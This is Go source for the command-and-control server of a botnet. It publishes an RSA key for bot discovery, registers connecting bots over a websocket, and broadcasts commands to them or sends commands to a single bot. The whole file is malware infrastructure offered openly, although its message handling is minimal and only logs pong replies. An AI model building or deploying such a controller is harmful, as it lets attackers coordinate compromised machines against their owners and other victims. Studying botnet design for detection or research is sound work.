package ccserver

import (
	"crypto/rsa"
	"encoding/json"
	"log"
	"net/http"

	"github.com/adrianosela/botnet/command-and-control/ccworker"
	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
)

// CommandAndControl is the command and control - controller
type CommandAndControl struct {
	msgDecryptKey *rsa.PrivateKey
	msgEncryptKey string
	bots          map[string]*ccworker.BotWorker
	// for inbound decrypted bot messages to be handled one-by-one
	recvMsgChan chan *protocol.Message
}

// NewCommandAndControl is the constructor for a CommandAndControl
func NewCommandAndControl() (*CommandAndControl, error) {
	log.Println("[cmd&ctrl] generating command and control public key...")
	priv, pub, err := encryption.GenerateRSAKeyPair(8192)
	if err != nil {
		return nil, err
	}
	log.Printf("[cmd&ctrl] command and control public key: \n%s", string(pub))
	return &CommandAndControl{
		msgDecryptKey: priv,
		msgEncryptKey: string(pub),
		bots:          make(map[string]*ccworker.BotWorker),
		recvMsgChan:   make(chan *protocol.Message),
	}, nil
}

// RunBotnet begins botnet communication
func (cc *CommandAndControl) RunBotnet() {
	for {
		select {
		case msg := <-cc.recvMsgChan:
			cc.HandleBotMessage(msg)
		}
	}
}

// ReleaseBot de registers a bot from a botnet
func (cc *CommandAndControl) ReleaseBot(id string) {
	if bot, ok := cc.bots[id]; ok {
		delete(cc.bots, id)
		bot.GreafulShutdown()
	}
	log.Printf("[cmd&ctrl] bot %s left net", id)
}

// HandleBotMessage handles a single given message
func (cc *CommandAndControl) HandleBotMessage(msg *protocol.Message) {
	switch msg.Type {
	case protocol.MessageTypePong:
		log.Printf("[pong] %v", msg)
		return
	default:
		log.Printf("received message of unhandled type: %v", msg)
		return
	}
}

// BroadcastCommand broadcasts a command to all bots
func (cc *CommandAndControl) BroadcastCommand(cmd *protocol.Command) {
	log.Printf("[cmd&ctrl] broadcasting command to %d bots\n", len(cc.bots))
	for botID := range cc.bots {
		cc.SendCommandToBot(cmd, botID)
	}
}

// SendCommandToBot sends a command to only one given bot
func (cc *CommandAndControl) SendCommandToBot(cmd *protocol.Command, botID string) {
	if err := cc.bots[botID].SendCommandToRemote(cmd); err != nil {
		cc.ReleaseBot(botID)
	}
}

// KeyHTTPHandler serves the CC server's public key
func (cc *CommandAndControl) KeyHTTPHandler(w http.ResponseWriter, r *http.Request) {
	ccDiscoveryBytes, err := json.Marshal(&protocol.CCDiscovery{Key: cc.msgEncryptKey})
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("could not return command and control discovery struct"))
		return
	}
	w.WriteHeader(http.StatusOK)
	w.Write(ccDiscoveryBytes)
	return
}

// CommandAndControlHTTPHandler serves the HTTP entrypoint to the botnet websocket
func (cc *CommandAndControl) CommandAndControlHTTPHandler(w http.ResponseWriter, r *http.Request) {
	// dispatch a new worker to handle the underlying botnet communication protocol
	bot, err := ccworker.DispatchNewBot(w, r, cc.msgDecryptKey, cc.recvMsgChan)
	if err != nil {
		w.WriteHeader(http.StatusTeapot)
		w.Write([]byte(":("))
		log.Printf(" [cmd&ctrl] there was a failed bot dispatch for %s: %s", r.RemoteAddr, r.UserAgent())
		return
	}
	// add bot to global map of bot workers
	cc.bots[bot.ID] = bot
	log.Printf("[cmd&ctrl] bot %s joined net", bot.ID)
}
